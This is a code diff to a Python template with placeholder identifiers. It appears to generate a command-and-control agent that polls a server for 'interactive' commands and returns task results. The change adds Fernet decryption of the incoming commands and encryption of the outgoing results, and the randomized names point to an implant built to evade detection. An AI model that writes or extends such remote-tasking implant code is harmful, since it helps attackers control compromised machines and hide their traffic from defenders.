@@ -295,19 +295,38 @@ class {class_name}:
 
     def {m_get_interactive_command}(self):
         response_data = self.{m_send}('GET', self.{v_interactive_uri})
-        
+
         if response_data and response_data.get('status') == 'success':
             if response_data.get('interactive_mode') and response_data.get('command'):
+                # Decrypt the command if encryption is available
+                command = response_data['command']
+                if hasattr(self, '{v_fernet}') and self.{v_fernet}:
+                    try:
+                        decrypted_command = self.{m_decrypt_data}(command)
+                        command = decrypted_command
+                    except Exception as e:
+                        # If decryption fails, use the original command
+                        pass
+
                 return {{
-                    'command': response_data['command'],
+                    'command': command,
                     'task_id': response_data.get('task_id'),
                     'interactive_mode': True
                 }}
-                
+
         return None
 
     def {m_submit_interactive_result}(self, task_id, result):
-        data = {{'task_id': task_id, 'result': result}}
+        # Encrypt the result if encryption is available
+        encrypted_result = result
+        if hasattr(self, '{v_fernet}') and self.{v_fernet}:
+            try:
+                encrypted_result = self.{m_encrypt_data}(result)
+            except Exception as e:
+                # If encryption fails, use the original result
+                pass
+
+        data = {{'task_id': task_id, 'result': encrypted_result}}
         response_data = self.{m_send}('POST', self.{v_interactive_uri}, data)
         success = response_data is not None and response_data.get('status') == 'success'
         return success
